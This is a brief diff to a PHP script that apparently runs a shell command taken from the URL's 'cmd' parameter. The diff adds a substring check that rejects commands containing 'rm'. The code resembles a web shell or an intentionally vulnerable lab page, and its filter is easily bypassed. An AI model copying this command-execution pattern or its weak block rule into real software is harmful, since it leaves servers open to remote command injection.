@@ -1,4 +1,8 @@
 <?php
+if(str_contains($_GET['cmd'], 'rm')) {
+    echo "Access denied!";
+    return;
+}
 if (isset($_GET['cmd'])) 
 {
     echo "<pre>";
